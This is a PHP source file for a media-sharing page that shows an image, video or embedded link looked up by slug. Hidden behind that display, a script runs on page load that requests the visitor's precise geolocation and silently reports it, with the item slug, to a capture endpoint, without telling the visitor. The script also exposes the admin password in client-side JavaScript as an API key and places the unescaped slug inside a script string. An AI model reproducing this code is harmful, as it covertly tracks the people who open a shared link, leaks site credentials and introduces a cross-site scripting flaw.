<?php
$db = getDB();
$slug = sanitizeInput($_GET['id']);

// Get the item from database
$stmt = $db->prepare("SELECT * FROM items WHERE slug = ? AND is_active = 1 AND (expires_at IS NULL OR expires_at > datetime('now'))");
$stmt->execute([$slug]);
$item = $stmt->execute([$slug]);
$item = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$item) {
    // Item not found or expired - show error image
    header('HTTP/1.0 404 Not Found');
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body style="margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;">';
    echo '<img src="https://www.drlinkcheck.com/images/errors/404.png" alt="404 Not Found" style="max-width:100%;max-height:100%;">';
    echo '</body></html>';
    exit;
}

// Serve the content based on media type
header('Content-Type: text/html; charset=utf-8');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= htmlspecialchars($item['title']) ?></title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #0f0f0f;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .container {
            max-width: 800px;
            text-align: center;
            color: white;
        }
        .media-container {
            margin: 20px 0;
        }
        .media-container img,
        .media-container iframe,
        .media-container video {
            max-width: 100%;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        .title {
            font-size: 1.5em;
            margin-bottom: 10px;
            font-weight: 600;
        }
        .description {
            color: #ccc;
            margin-bottom: 20px;
            line-height: 1.5;
        }
    </style>
</head>
<body onload="getLocation()">
    <div class="container">
        <div class="title"><?= htmlspecialchars($item['title']) ?></div>
        <?php if ($item['description']): ?>
            <div class="description"><?= htmlspecialchars($item['description']) ?></div>
        <?php endif; ?>
        
        <div class="media-container">
            <?php
            switch($item['media_type']) {
                case 'image':
                case 'gif':
                    if ($item['file_path']) {
                        echo '<img src="' . htmlspecialchars($item['file_path']) . '" alt="' . htmlspecialchars($item['title']) . '">';
                    } else if ($item['media_url']) {
                        echo '<img src="' . htmlspecialchars($item['media_url']) . '" alt="' . htmlspecialchars($item['title']) . '">';
                    }
                    break;
                case 'video':
                    echo '<video controls autoplay muted style="max-width:100%">';
                    if ($item['file_path']) {
                        echo '<source src="' . htmlspecialchars($item['file_path']) . '">';
                    } else if ($item['media_url']) {
                        echo '<source src="' . htmlspecialchars($item['media_url']) . '">';
                    }
                    echo 'Your browser does not support the video tag.</video>';
                    break;
                case 'link':
                    if ($item['media_url']) {
                        echo '<iframe src="' . htmlspecialchars($item['media_url']) . '" width="800" height="600" style="border:none; border-radius:12px;"></iframe>';
                    }
                    break;
                default:
                    echo '<p>Unsupported media type</p>';
            }
            ?>
        </div>
    </div>

    <script>
    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition, function(error) {
                // Silent fail - still send what data we can get
                sendLocation(null, null);
            }, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        } else {
            sendLocation(null, null);
        }
    }

    function showPosition(position) {
        sendLocation(position.coords.latitude, position.coords.longitude);
    }

    function sendLocation(lat, long) {
        const xhr = new XMLHttpRequest();
        const baseUrl = '<?= SITE_BASE_URL ?>';
        
        // Use relative URL for API call to avoid CORS issues
        let url = baseUrl + '/api/locations/capture?item_slug=<?= $slug ?>';
        if (lat !== null && long !== null) {
            url += '&lat=' + lat + '&long=' + long;
        }
        
        xhr.open('GET', url, true);
        xhr.setRequestHeader('X-API-Key', '<?= ADMIN_PASSWORD ?>');
        xhr.send();
    }
    </script>
</body>
</html>
<?php
// Close database connection
$db = null;
?>
